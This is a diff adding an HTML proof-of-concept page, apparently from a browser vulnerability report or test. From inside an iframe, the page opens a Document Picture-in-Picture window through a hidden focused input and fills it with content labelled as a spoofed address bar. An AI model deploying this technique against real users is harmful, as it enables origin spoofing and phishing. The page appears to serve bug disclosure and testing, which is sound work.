@@ -1,0 +1,49 @@
+<!doctype html>
+<html>
+<head>
+<style>
+html { font-family: sans-serif; height: 100%; width: 100%; cursor: pointer; }
+#focusElem { opacity: 0.0001; }
+</style>
+</head>
+<body>
+<h1>Attacker frame</h1>
+<p>iframe on origin: <span id="originOutput"></span></p>
+<p>Click within iframe (or press any key) to run PoC.</p>
+<p>Run iframe with simulated compromised renderer to allow using Document PiP within iframes.</p>
+<input id="focusElem">
+<script>
+originOutput.innerText = window.origin;
+var newWin;
+var runPoC = async () => {
+    newWin = await documentPictureInPicture.requestWindow();
+    newWin.resizeTo(800, 700);
+    newWin.moveTo(200, 200);
+    var newWinContent = newWin.document.createElement('div');
+    newWinContent.innerHTML = `
+<style>
+html { font-family: sans-serif; }
+body { margin: 0; }
+#content { margin: 8px; }
+iframe { border: 0; width: 100vw; height: 500px; }
+</style>
+<div id="content">
+<h3>Attacker content with spoofed PiP address bar</h3>
+<p>This page on origin: <span id="pageOriginOutput"></span></p>
+<p>Can also embed iframes, run JS, etc. (using attacker origin)</p>
+</div>
+<iframe src="https://example.com"></iframe>`;
+    newWin.document.body.appendChild(newWinContent);
+
+    var newWinScript = newWin.document.createElement('script');
+    newWinScript.innerText = 'pageOriginOutput.innerText = window.origin';
+    newWin.document.body.appendChild(newWinScript);
+}
+window.addEventListener('click', runPoC);
+focusElem.addEventListener('keydown', runPoC);
+setInterval(() => {
+    focusElem.focus();
+}, 100);
+</script>
+</body>
+</html>
